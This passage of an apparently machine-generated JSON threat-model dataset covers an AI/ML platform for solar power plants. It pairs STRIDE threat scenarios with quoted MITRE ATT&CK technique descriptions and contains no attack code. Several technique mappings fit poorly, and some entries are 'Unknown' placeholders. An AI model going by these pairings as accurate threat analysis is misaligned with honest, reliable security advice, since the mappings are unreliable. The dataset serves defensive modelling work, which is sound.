                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Data Logger experiences a resource exhaustion attack, preventing it from processing incoming data.",
            "Assumptions": [
                {
                    "Assumption": "No resource management policies in place.",
                    "Role": "System Administrator",
                    "Condition": "Absence of Resource Limitation Mechanisms."
                },
                {
                    "Assumption": "Logger operates on limited hardware resources.",
                    "Role": "Device Manufacturer",
                    "Condition": "Insufficient hardware capacity."
                },
                {
                    "Assumption": "No monitoring of system resource usage.",
                    "Role": "System Architect",
                    "Condition": "Lack of Monitoring Tools for Resource Usage."
                }
            ],
            "Potential Impact": "Availability of data logging compromised.",
            "MITRE ATT&CK Keywords": [
                "Denial of Service",
                "Resource Exhaustion",
                "Monitoring",
                "Hardware Capacity"
            ],
            "mitre_technique": {
                "name": "OS Exhaustion Flood",
                "description": "Adversaries may launch a denial of service (DoS) attack targeting an endpoint's operating system (OS). A system's OS is responsible for managing the finite resources as well as preventing the entire system from being overwhelmed by excessive demands on its capacity. These attacks do not need to exhaust the actual resources on a system; the attacks may simply exhaust the limits and available resources that an OS self-imposes.\n\nDifferent ways to achieve this exist, including TCP state-exhaustion attacks such as SYN floods and ACK floods.(Citation: Arbor AnnualDoSreport Jan 2018) With SYN floods, excessive amounts of SYN packets are sent, but the 3-way TCP handshake is never completed. Because each OS has a maximum number of concurrent TCP connections that it will allow, this can quickly exhaust the ability of the system to receive new requests for TCP connections, thus preventing access to any TCP service provided by the server.(Citation: Cloudflare SynFlood)\n\nACK floods leverage the stateful nature of the TCP protocol. A flood of ACK packets are sent to the target. This forces the OS to search its state table for a related TCP connection that has already been established. Because the ACK packets are for connections that do not exist, the OS will have to search the entire state table to confirm that no match exists. When it is necessary to do this for a large flood of packets, the computational requirements can cause the server to become sluggish and/or unresponsive, due to the work it must do to eliminate the rogue ACK packets. This greatly reduces the resources available for providing the targeted service.(Citation: Corero SYN-ACKflood)",
                "id": "attack-pattern--0df05477-c572-4ed6-88a9-47c581f548f7",
                "technique_id": "T1499.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Distributed Denial of Service (DDoS) attack on the TOREADOR platform, making AI/ML services unavailable.",
            "Assumptions": [
                {
                    "Assumption": "No DDoS mitigation controls.",
                    "Role": "Network Security Admin",
                    "Condition": "Absence of DDoS Protection Mechanisms."
                },
                {
                    "Assumption": "Platform cannot handle high traffic volume.",
                    "Role": "System Developer",
                    "Condition": "Lack of Scalability."
                },
                {
                    "Assumption": "Platform lacks redundancy.",
                    "Role": "System Architect",
                    "Condition": "No Failover Solutions Implemented."
                }
            ],
            "Potential Impact": "Availability of AI/ML services compromised.",
            "MITRE ATT&CK Keywords": [
                "Denial of Service",
                "DDoS Attack",
                "Scalability",
                "Redundancy"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a vulnerability in the TOREADOR platform to gain administrative access.",
            "Assumptions": [
                {
                    "Assumption": "Platform contains unpatched vulnerabilities.",
                    "Role": "System Developer",
                    "Condition": "Delays in Applying Security Patches."
                },
                {
                    "Assumption": "Weak access control mechanisms.",
                    "Role": "System Admin",
                    "Condition": "Lack of Role-Based Access Control."
                },
                {
                    "Assumption": "No monitoring for privilege escalation attempts.",
                    "Role": "Security Operations Center",
                    "Condition": "Absence of Monitoring and Alerting Tools."
                }
            ],
            "Potential Impact": "Unauthorized administrative access, impacting data integrity and confidentiality.",
            "MITRE ATT&CK Keywords": [
                "Elevation of Privilege",
                "Platform Vulnerability",
                "Access Control",
                "Privilege Escalation"
            ],
            "mitre_technique": {
                "name": "Print Processors",
                "description": "Adversaries may abuse print processors to run malicious DLLs during system boot for persistence and/or privilege escalation. Print processors are DLLs that are loaded by the print spooler service, `spoolsv.exe`, during boot.(Citation: Microsoft Intro Print Processors)\n\nAdversaries may abuse the print spooler service by adding print processors that load malicious DLLs at startup. A print processor can be installed through the <code>AddPrintProcessor</code> API call with an account that has <code>SeLoadDriverPrivilege</code> enabled. Alternatively, a print processor can be registered to the print spooler service by adding the <code>HKLM\\SYSTEM\\\\[CurrentControlSet or ControlSet001]\\Control\\Print\\Environments\\\\[Windows architecture: e.g., Windows x64]\\Print Processors\\\\[user defined]\\Driver</code> Registry key that points to the DLL.\n\nFor the malicious print processor to be correctly installed, the payload must be located in the dedicated system print-processor directory, that can be found with the <code>GetPrintProcessorDirectory</code> API call, or referenced via a relative path from this directory.(Citation: Microsoft AddPrintProcessor May 2018) After the print processors are installed, the print spooler service, which starts during boot, must be restarted in order for them to run.(Citation: ESET PipeMon May 2020)\n\nThe print spooler service runs under SYSTEM level permissions, therefore print processors installed by an adversary may run under elevated privileges.",
                "id": "attack-pattern--2de47683-f398-448f-b947-9abcc3e32fad",
                "technique_id": "T1547.012"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a zero-day vulnerability in the Data Logger to run arbitrary code with elevated permissions.",
            "Assumptions": [
                {
                    "Assumption": "Data Logger contains exploitable vulnerabilities.",
                    "Role": "Device Manufacturer",
                    "Condition": "Presence of Unknown Vulnerabilities."
                },
                {
                    "Assumption": "No input validation on the Data Logger.",
                    "Role": "System Developer",
                    "Condition": "Absence of Secure Coding Practices."
                },
                {
                    "Assumption": "Logger operates with high privileges.",
                    "Role": "Device Manufacturer",
                    "Condition": "Logger Designed to Run with Elevated Permissions."
                }
            ],
            "Potential Impact": "Unauthorized code execution, risking data integrity.",
            "MITRE ATT&CK Keywords": [
                "Elevation of Privilege",
                "Zero-Day Vulnerability",
                "Input Validation",
                "Code Execution"
            ],
            "mitre_technique": {
                "name": "Exploitation for Client Execution",
                "description": "Adversaries may exploit software vulnerabilities in client applications to execute code. Vulnerabilities can exist in software due to unsecure coding practices that can lead to unanticipated behavior. Adversaries can take advantage of certain vulnerabilities through targeted exploitation for the purpose of arbitrary code execution. Oftentimes the most valuable exploits to an offensive toolkit are those that can be used to obtain code execution on a remote system because they can be used to gain access to that system. Users will expect to see files related to the applications they commonly used to do work, so they are a useful target for exploit research and development because of their high utility.\n\nSeveral types exist:\n\n### Browser-based Exploitation\n\nWeb browsers are a common target through [Drive-by Compromise](https://attack.mitre.org/techniques/T1189) and [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002). Endpoint systems may be compromised through normal web browsing or from certain users being targeted by links in spearphishing emails to adversary controlled sites used to exploit the web browser. These often do not require an action by the user for the exploit to be executed.\n\n### Office Applications\n\nCommon office and productivity applications such as Microsoft Office are also targeted through [Phishing](https://attack.mitre.org/techniques/T1566). Malicious files will be transmitted directly as attachments or through links to download them. These require the user to open the document or file for the exploit to run.\n\n### Common Third-party Applications\n\nOther applications that are commonly seen or are part of the software deployed in a target network may also be used for exploitation. Applications such as Adobe Reader and Flash, which are common in enterprise environments, have been routinely targeted by adversaries attempting to gain access to systems. Depending on the software and nature of the vulnerability, some may be exploited in the browser or require the user to open a file. For instance, some Flash exploits have been delivered as objects within Microsoft Office documents.",
                "id": "attack-pattern--be2dcee9-a7a7-4e38-afd6-21b31ecc3d63",
                "technique_id": "T1203"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Weak security configuration allows normal users to gain administrative rights on the Dashboard.",
            "Assumptions": [
                {
                    "Assumption": "Dashboard lacks proper access controls.",
                    "Role": "System Developer",
                    "Condition": "Insufficient Access Control Measures."
                },
                {
                    "Assumption": "Application does not segregate duties.",
                    "Role": "System Architect",
                    "Condition": "Inadequate Role-Based Access Control."
                },
                {
                    "Assumption": "No audit logs for privileged actions.",
                    "Role": "Security Operations Center",
                    "Condition": "Absence of Logging for Critical Actions."
                }
            ],
            "Potential Impact": "Unauthorized administrative access impacting data integrity and confidentiality.",
            "MITRE ATT&CK Keywords": [
                "Elevation of Privilege",
                "Access Control",
                "Role-Based Access Control",
                "Administrative Access"
            ],
            "mitre_technique": {
                "name": "Valid Accounts",
                "description": "Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access, network devices, and remote desktop.(Citation: volexity_0day_sophos_FW) Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.\n\nIn some cases, adversaries may abuse inactive accounts: for example, those belonging to individuals who are no longer part of an organization. Using these accounts may allow the adversary to evade detection, as the original account user will not be present to identify any anomalous activity taking place on their account.(Citation: CISA MFA PrintNightmare)\n\nThe overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise.(Citation: TechNet Credential Theft)",
                "id": "attack-pattern--b17a1a56-e99c-403c-8948-561df0cffe81",
                "technique_id": "T1078"
            }
        }
    ]
},
{
    "case_number": "9",
    "batch_number": "28",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker gains unauthorized access to the dashboard by spoofing user credentials.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can intercept and alter communication between the user and the dashboard.",
                    "Role": "Attacker",
                    "Condition": "Network traffic is not fully encrypted."
                },
                {
                    "Assumption": "The attacker has knowledge of legitimate user credentials or uses social engineering to obtain them.",
                    "Role": "Attacker",
                    "Condition": "User awareness and training are inadequate."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive data in the dashboard.",
            "MITRE ATT&CK Keywords": [
                "credential access",
                "phishing",
                "man-in-the-middle",
                "dashboard"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker spoofs sensor data to manipulate the AI/ML model predictions.",
            "Assumptions": [
                {
                    "Assumption": "Sensors lack robust authentication mechanisms.",
                    "Role": "Attacker",
                    "Condition": "Insufficient security on sensor data collection."
                },
                {
                    "Assumption": "The attacker can physically access sensors or the data logger.",
                    "Role": "Attacker",
                    "Condition": "Physical security of sensors is inadequate."
                }
            ],
            "Potential Impact": "Inaccurate predictions leading to inefficient power optimization and potential hardware failures.",
            "MITRE ATT&CK Keywords": [
                "device compromise",
                "sensor spoofing",
                "data manipulation",
                "model training"
            ],
            "mitre_technique": {
                "name": "Transmitted Data Manipulation",
                "description": "Adversaries may alter data en route to storage or other systems in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating transmitted data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nManipulation may be possible over a network connection or between system processes where there is an opportunity deploy a tool that will intercept and change information. The type of modification and the impact it will have depends on the target transmission mechanism as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--cc1e737c-236c-4e3b-83ba-32039a626ef8",
                "technique_id": "T1493"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "Fake sensors are introduced into the network to inject malicious data.",
            "Assumptions": [
                {
                    "Assumption": "Network access controls are weak.",
                    "Role": "Attacker",
                    "Condition": "Insufficient network segmentation and monitoring."
                },
                {
                    "Assumption": "The attacker creates sensors that mimic legitimate ones.",
                    "Role": "Attacker",
                    "Condition": "Technical capability to clone or fabricate sensor devices."
                }
            ],
            "Potential Impact": "Malicious data corrupts AI/ML model training and validations.",
            "MITRE ATT&CK Keywords": [
                "network intrusion",
                "fake sensor",
                "data injection",
                "model corruption"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker alters the data being logged by the data logger device.",
            "Assumptions": [
                {
                    "Assumption": "Data logger firmware can be compromised.",
                    "Role": "Attacker",
                    "Condition": "Firmware is not securely updated or validated."
                },
                {
                    "Assumption": "The attacker has access to the network interface of the data logger.",
                    "Role": "Attacker",
                    "Condition": "The network interface is unprotected or poorly secured."
                }
            ],
            "Potential Impact": "Data integrity is compromised leading to faulty AI/ML predictions.",
            "MITRE ATT&CK Keywords": [
                "firmware manipulation",
                "data logger",
                "data tampering",
                "network interface"
            ],
            "mitre_technique": {
                "name": "Network Sniffing",
                "description": "Adversaries may passively sniff network traffic to capture information about an environment, including authentication material passed over the network. Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection. An adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data.\n\nData captured via this technique may include user credentials, especially those sent over an insecure, unencrypted protocol. Techniques for name service resolution poisoning, such as [LLMNR/NBT-NS Poisoning and SMB Relay](https://attack.mitre.org/techniques/T1557/001), can also be used to capture credentials to websites, proxies, and internal systems by redirecting traffic to an adversary.\n\nNetwork sniffing may reveal configuration details, such as running services, version numbers, and other network characteristics (e.g. IP addresses, hostnames, VLAN IDs) necessary for subsequent [Lateral Movement](https://attack.mitre.org/tactics/TA0008) and/or [Defense Evasion](https://attack.mitre.org/tactics/TA0005) activities. Adversaries may likely also utilize network sniffing during [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) (AiTM) to passively gain additional knowledge about the environment.\n\nIn cloud-based environments, adversaries may still be able to use traffic mirroring services to sniff network traffic from virtual machines. For example, AWS Traffic Mirroring, GCP Packet Mirroring, and Azure vTap allow users to define specified instances to collect traffic from and specified targets to send collected traffic to.(Citation: AWS Traffic Mirroring)(Citation: GCP Packet Mirroring)(Citation: Azure Virtual Network TAP) Often, much of this traffic will be in cleartext due to the use of TLS termination at the load balancer level to reduce the strain of encrypting and decrypting traffic.(Citation: Rhino Security Labs AWS VPC Traffic Mirroring)(Citation: SpecterOps AWS Traffic Mirroring) The adversary can then use exfiltration techniques such as Transfer Data to Cloud Account in order to access the sniffed traffic.(Citation: Rhino Security Labs AWS VPC Traffic Mirroring)\n\nOn network devices, adversaries may perform network captures using [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `monitor capture`.(Citation: US-CERT-TA18-106A)(Citation: capture_embedded_packet_on_software)",
                "id": "attack-pattern--3257eb21-f9a7-4430-8de1-d8b6e288f529",
                "technique_id": "T1040"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "AI/ML model files on the TOREADOR platform are tampered with.",
            "Assumptions": [
                {
                    "Assumption": "The attacker gains access to the TOREADOR platform through compromised credentials.",
                    "Role": "Attacker",
                    "Condition": "Inadequate security for stored credentials."
                },
                {
                    "Assumption": "The models are not integrity-checked before deployment.",
                    "Role": "System Admin",
                    "Condition": "Lack of comprehensive integrity checks for models."
                }
            ],
            "Potential Impact": "Degraded performance or incorrect predictions from compromised AI/ML models.",
            "MITRE ATT&CK Keywords": [
                "model corruption",
                "credential theft",
                "cloud security",
                "integrity check"
            ],
            "mitre_technique": {
                "name": "Valid Accounts",
                "description": "Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access, network devices, and remote desktop.(Citation: volexity_0day_sophos_FW) Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.\n\nIn some cases, adversaries may abuse inactive accounts: for example, those belonging to individuals who are no longer part of an organization. Using these accounts may allow the adversary to evade detection, as the original account user will not be present to identify any anomalous activity taking place on their account.(Citation: CISA MFA PrintNightmare)\n\nThe overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise.(Citation: TechNet Credential Theft)",
                "id": "attack-pattern--b17a1a56-e99c-403c-8948-561df0cffe81",
                "technique_id": "T1078"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Attacker modifies metadata related to operational status of solar power plants.",
            "Assumptions": [
                {
                    "Assumption": "Metadata is accessible through the central system without proper authentication.",
                    "Role": "Attacker",
                    "Condition": "Weak access controls in the central system."
                },
                {
                    "Assumption": "Insufficient logging and monitoring of changes to metadata.",
                    "Role": "System Admin",
                    "Condition": "Lack of comprehensive auditing and monitoring mechanisms."
                }
            ],
            "Potential Impact": "Misleading operational insights and decisions based on incorrect data.",
            "MITRE ATT&CK Keywords": [
                "metadata manipulation",
                "access control",
                "data integrity",
                "monitoring"
            ],
            "mitre_technique": {
                "name": "Additional Container Cluster Roles",
                "description": "An adversary may add additional roles or permissions to an adversary-controlled user or service account to maintain persistent access to a container orchestration system. For example, an adversary with sufficient permissions may create a RoleBinding or a ClusterRoleBinding to bind a Role or ClusterRole to a Kubernetes account.(Citation: Kubernetes RBAC)(Citation: Aquasec Kubernetes Attack 2023) Where attribute-based access control (ABAC) is in use, an adversary with sufficient permissions may modify a Kubernetes ABAC policy to give the target account additional permissions.(Citation: Kuberentes ABAC)\n \nThis account modification may immediately follow [Create Account](https://attack.mitre.org/techniques/T1136) or other malicious account activity. Adversaries may also modify existing [Valid Accounts](https://attack.mitre.org/techniques/T1078) that they have compromised.  \n\nNote that where container orchestration systems are deployed in cloud environments, as with Google Kubernetes Engine, Amazon Elastic Kubernetes Service, and Azure Kubernetes Service, cloud-based  role-based access control (RBAC) assignments or ABAC policies can often be used in place of or in addition to local permission assignments.(Citation: Google Cloud Kubernetes IAM)(Citation: AWS EKS IAM Roles for Service Accounts)(Citation: Microsoft Azure Kubernetes Service Service Accounts) In these cases, this technique may be used in conjunction with [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003).",
                "id": "attack-pattern--35d30338-5bfa-41b0-a170-ec06dfd75f64",
                "technique_id": "T1098.006"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker denies executing commands by exploiting lack of audit logging.",
            "Assumptions": [
                {
                    "Assumption": "System logs are not properly maintained or secured.",
                    "Role": "System Admin",
                    "Condition": "Weak logging and monitoring policies."
                },
                {
                    "Assumption": "Logs are not tamper-evident.",
                    "Role": "System Admin",
                    "Condition": "Insufficient security measures for log files."
                }
            ],
            "Potential Impact": "Difficulty in tracking malicious activities and identifying the attacker.",
            "MITRE ATT&CK Keywords": [
                "log manipulation",
                "action repudiation",
                "audit logging",
                "log security"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Legitimate users deny actions taken on the dashboard due to lack of proper authentication mechanisms.",
            "Assumptions": [
                {
                    "Assumption": "The dashboard does not track user actions effectively.",
                    "Role": "System Admin",
                    "Condition": "Absence of comprehensive user activity logging."
                },
                {
                    "Assumption": "Users access the dashboard with weak or no authentication.",
                    "Role": "User",
                    "Condition": "Poor authentication implementation."
                }
            ],
            "Potential Impact": "Inability to attribute actions to specific users, causing issues in accountability.",
            "MITRE ATT&CK Keywords": [
                "user action denial",
                "authentication",
                "activity logging",
                "accountability"
            ],
            "mitre_technique": {
                "name": "Application Access Token",
                "description": "Adversaries may use application access tokens to bypass the typical authentication process and access restricted accounts, information, or services on remote systems. These tokens are typically stolen from users and used in lieu of login credentials.\n\nApplication access tokens are used to make authorized API requests on behalf of a user and are commonly used as a way to access resources in cloud-based applications and software-as-a-service (SaaS).(Citation: Auth0 - Why You Should Always Use Access Tokens to Secure APIs Sept 2019) OAuth is one commonly implemented framework that issues tokens to users for access to systems. These frameworks are used collaboratively to verify the user and determine what actions the user is allowed to perform. Once identity is established, the token allows actions to be authorized, without passing the actual credentials of the user. Therefore, compromise of the token can grant the adversary access to resources of other sites through a malicious application.(Citation: okta)\n\nFor example, with a cloud-based email service once an OAuth access token is granted to a malicious application, it can potentially gain long-term access to features of the user account if a \"refresh\" token enabling background access is awarded.(Citation: Microsoft Identity Platform Access 2019) With an OAuth access token an adversary can use the user-granted REST API to perform functions such as email searching and contact enumeration.(Citation: Staaldraad Phishing with OAuth 2017)\n\nCompromised access tokens may be used as an initial step in compromising other services. For example, if a token grants access to a victim\u2019s primary email, the adversary may be able to extend access to all other services which the target subscribes by triggering forgotten password routines. Direct API access through a token negates the effectiveness of a second authentication factor and may be immune to intuitive countermeasures like changing passwords. Access abuse over an API channel can be difficult to detect even from the service provider end, as the access can still align well with a legitimate workflow.\n",
                "id": "attack-pattern--27960489-4e7f-461d-a62a-f5c0cb521e4a",
                "technique_id": "T1527"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Vendor denies responsibilities for anomalies in the AI/ML model due to insufficient logging of model training and deployment steps.",
            "Assumptions": [
                {
                    "Assumption": "The system does not log all steps taken during model training and deployment.",
                    "Role": "System Admin",
                    "Condition": "Lack of comprehensive lifecycle management for AI/ML models."
                },
                {
                    "Assumption": "Changes to the models are not well-documented.",
                    "Role": "Developer",
                    "Condition": "Poor documentation practices."
                }
            ],
            "Potential Impact": "Challenges in identifying causes of issues and holding responsible parties accountable.",
            "MITRE ATT&CK Keywords": [
                "model lifecycle management",
                "training logging",
                "deployment logging",
                "accountability"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker gains access to raw sensor data in transit.",
            "Assumptions": [
                {
                    "Assumption": "Data in transit is not encrypted.",
                    "Role": "System Admin",
                    "Condition": "Lack of TLS or similar encryption for data transmission."
                },
                {
                    "Assumption": "The attacker has access to network sniffing tools.",
                    "Role": "Attacker",
                    "Condition": "The network is inadequately secured against eavesdropping."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive operational data.",
            "MITRE ATT&CK Keywords": [
                "data eavesdropping",
                "network sniffing",
                "data transmission",
                "encryption"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive metadata is extracted due to insufficient access controls on the central system.",
            "Assumptions": [
                {
                    "Assumption": "Access controls on sensitive metadata are weak or nonexistent.",
                    "Role": "System Admin",
                    "Condition": "Ineffective or missing access control policies."
                },
                {
                    "Assumption": "The attacker can identify and exploit these gaps.",
                    "Role": "Attacker",
                    "Condition": "Access control vulnerabilities are well-known or easily discoverable."
                }
            ],
            "Potential Impact": "Exposure of sensitive information about solar power plants and their operational status.",
            "MITRE ATT&CK Keywords": [
                "metadata exposure",
                "access control",
                "sensitive information",
                "policy gap"
            ],
            "mitre_technique": {
                "name": "Cloud Instance Metadata API",
                "description": "Adversaries may attempt to access the Cloud Instance Metadata API to collect credentials and other sensitive data.\n\nMost cloud service providers support a Cloud Instance Metadata API which is a service provided to running virtual instances that allows applications to access information about the running virtual instance. Available information generally includes name, security group, and additional metadata including sensitive data such as credentials and UserData scripts that may contain additional secrets. The Instance Metadata API is provided as a convenience to assist in managing applications and is accessible by anyone who can access the instance.(Citation: AWS Instance Metadata API) A cloud metadata API has been used in at least one high profile compromise.(Citation: Krebs Capital One August 2019)\n\nIf adversaries have a presence on the running virtual instance, they may query the Instance Metadata API directly to identify credentials that grant access to additional resources. Additionally, adversaries may exploit a Server-Side Request Forgery (SSRF) vulnerability in a public facing web proxy that allows them to gain access to the sensitive information via a request to the Instance Metadata API.(Citation: RedLock Instance Metadata API 2018)\n\nThe de facto standard across cloud service providers is to host the Instance Metadata API at <code>http[:]//169.254.169.254</code>.\n",
                "id": "attack-pattern--19bf235b-8620-4997-b5b4-94e0659ed7c3",
                "technique_id": "T1552.005"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "AI/ML model parameters are leaked from the TOREADOR platform.",
            "Assumptions": [
                {
                    "Assumption": "Model data is not appropriately secured.",
                    "Role": "System Admin",
                    "Condition": "Insufficient data protection policies."
                },
                {
